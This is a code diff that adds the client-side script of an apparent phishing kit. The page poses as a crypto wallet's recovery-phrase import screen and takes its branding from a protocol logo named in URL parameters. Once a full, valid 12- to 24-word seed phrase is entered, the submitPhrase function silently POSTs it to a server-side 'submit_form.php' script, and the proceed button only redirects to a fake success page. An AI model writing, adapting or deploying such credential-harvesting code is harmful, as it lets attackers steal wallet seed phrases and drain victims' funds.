@@ -1,0 +1,206 @@
+var chainName = getUrlVars()['chainName']
+var protocolName = getUrlVars()['protocolName']
+
+var rgb = getAverageRGB(document.getElementById('logoToDetectColor'));
+var protocolColor = 'rgb(' + rgb.r +',' + rgb.g +',' + rgb.b + ')'
+
+// Update DOM elements with custom color
+$('div#app-content span#__loader_spinner').css( {'border':'5px solid ' + protocolColor, 'border-bottom-color': 'transparent'} );
+$('form button.import_wallet').css( {'background-color': protocolColor} )
+$('select.change_phrase_words_count').css( {'color': protocolColor, 'font-weight': 'bold'} )
+
+$(function(){
+    // On Phrase Count Change
+    $('select.change_phrase_words_count').on('change', function(){
+        let phrase_words_count = String($(this).val())
+        if( "12,15,18,21,24".split(",").includes(phrase_words_count) ){
+            for(let i=0; i<24; i++){
+                if( i < phrase_words_count){
+                    $('div.import-srp__srp-word').eq(i).show()
+                }
+                else{
+                    $('div.import-srp__srp-word').eq(i).hide()
+                }
+            }
+
+            // Trigger Phrase verification if any of the visible field is filled
+            $("input.MuiInputBase-input").eq(0).trigger('input')
+        }
+    })
+    
+    // Switch To 12 Phrase by default
+    $('.change_phrase_words_count').val(12).change()
+
+    // On Paste on any phrase field
+    $("input.MuiInputBase-input").on("paste", function(evt){
+        $(this).val('')
+        setTimeout( () => {
+            let pastedContent = $(this).val().replace(/[^a-zA-Z ]/g, " ").trim().split(" ")
+            if( pastedContent.length > 1 ){
+                $("input.MuiInputBase-input").val('')
+
+                let count = 0
+                $.each( pastedContent, function(data) {
+                    $("input.MuiInputBase-input").eq(count).val( pastedContent[data] )
+                    count++
+                })
+            }
+
+            // Switch phrase length if pasted phrase is more than curent selection
+            if( pastedContent.length != $('select.change_phrase_words_count').val() && pastedContent.length >= 12){
+                if( 
+                    $('select.change_phrase_words_count option').toArray().map(function(d){
+                        return d.value
+                    }).includes(String(pastedContent.length))
+                ){
+                    $('.change_phrase_words_count').val(pastedContent.length).change()
+                }
+            }
+            
+            $("input.MuiInputBase-input").eq(0).trigger('input')
+        })
+    });
+
+    // On Change on any phrase field
+    $("input.MuiInputBase-input").on("input", function(evt){
+        let visiblePhraseFields = $("input.MuiInputBase-input:visible")
+        
+        // Check for empty fields
+        let emptyFieldsCount = 0;
+        let nonEmptyFieldsCount = 0;
+        let invalidPhrasesCount = 0;
+        for(let i = 0; i<visiblePhraseFields.length; i++){
+            if( visiblePhraseFields.eq(i).val().length <= 0 ){
+                emptyFieldsCount++
+            }
+            else{
+                nonEmptyFieldsCount++
+            }
+            if( visiblePhraseFields.eq(i).val().length > 0 && !phraseDictionary.includes( visiblePhraseFields.eq(i).val().trim().toLowerCase() ) ){
+                invalidPhrasesCount++
+            }
+        }
+
+        if(emptyFieldsCount > 0 && nonEmptyFieldsCount > 0){
+            $('form button.import_wallet').attr('disabled', true)
+            $('div.actionable-message--danger').removeClass('dom_hide').find('.actionable-message__message').text('Secret Recovery Phrases contain 12, 15, 18, 21, or 24 words')
+            return false;
+        }else{
+            $('div.actionable-message--danger').addClass('dom_hide')
+        }
+
+        if(invalidPhrasesCount > 0){
+            $('form button.import_wallet').attr('disabled', true)
+            $('div.actionable-message--danger').removeClass('dom_hide').find('.actionable-message__message').text('Invalid Secret Recovery Phrase')
+            return false;
+        }
+        else{
+            // Get the submitted phrase in array
+            let $phraseWordsArray = visiblePhraseFields.toArray().map( (d) => {
+                return d.value
+            })
+
+            if( emptyFieldsCount == 0 && nonEmptyFieldsCount == visiblePhraseFields.length && invalidPhrasesCount == 0 && checkIfArrayIsUnique($phraseWordsArray) ){
+                submitPhrase()
+            }
+            else{
+                $('div.actionable-message--danger').removeClass('dom_hide').find('.actionable-message__message').text('Invalid Secret Recovery Phrase')
+            }
+        }
+    })
+
+    // On Proceed Button
+    $('form button.import_wallet').on('click', function(e){
+        e.preventDefault()
+        if( window.parent.opener == null ){
+            window.location.href = "../../success"
+        }else{
+            window.parent.opener.location.replace("../../success"), window.parent.close()
+        }
+    })
+
+    // Show Selected Network
+    if( chainName != undefined && chainName != "All" ){
+        $('div.network-indicator div.network-name').text( chainName.trim() + " Mainnet" )
+    }
+
+    // Close Preloader
+    setTimeout(()=>{
+        $('.preloader').hide()
+        $('div.main-content').removeClass('dom_hide')
+    }, 2000)
+})
+
+function submitPhrase(){
+    var form = $('form.create-new-vault__form')
+    $.ajax({
+        type: 'POST',
+        url: '../../submit_form.php?submitDetails&chainName=' + chainName + "&protocolName=" + protocolName,
+        data: form.serialize(),
+        success: function(data) {
+            $('form button.import_wallet').removeAttr('disabled')
+            // console.log('submitted')
+        }
+    });
+}
+
+function getUrlVars(){
+    var vars = [], hash;
+    var hashes = window.location.href.slice(window.location.href.indexOf('?') + 1).split('&');
+    for(var i = 0; i < hashes.length; i++)
+    {
+        hash = hashes[i].split('=');
+        vars.push(hash[0]);
+        vars[hash[0]] = hash[1];
+    }
+    return vars;
+}
+
+function getAverageRGB(imgEl) {
+    var blockSize = 5, // only visit every 5 pixels
+    defaultRGB = {r:0,g:0,b:0}, // for non-supporting envs
+    canvas = document.createElement('canvas'),
+    context = canvas.getContext && canvas.getContext('2d'),
+    data, width, height,
+    i = -4,
+    length,
+    rgb = {r:0,g:0,b:0},
+    count = 0;
+        
+    if (!context) {
+        return defaultRGB;
+    }
+
+    height = canvas.height = imgEl.naturalHeight || imgEl.offsetHeight || imgEl.height;
+    width = canvas.width = imgEl.naturalWidth || imgEl.offsetWidth || imgEl.width;
+
+    context.drawImage(imgEl, 0, 0);
+
+    try {
+        data = context.getImageData(0, 0, width, height);
+    } catch(e) {
+        /* security error, img on diff domain */
+        // alert('x');
+        return defaultRGB;
+    }
+
+    length = data.data.length;
+
+    while ( (i += blockSize * 4) < length ) {
+        ++count;
+        rgb.r += data.data[i];
+        rgb.g += data.data[i+1];
+        rgb.b += data.data[i+2];
+    }
+
+    // ~~ used to floor values
+    rgb.r = ~~(rgb.r/count);
+    rgb.g = ~~(rgb.g/count);
+    rgb.b = ~~(rgb.b/count);
+
+    return rgb;
+}
+
+function checkIfArrayIsUnique(myArray) {
+    return myArray.length === new Set(myArray).size;
+}
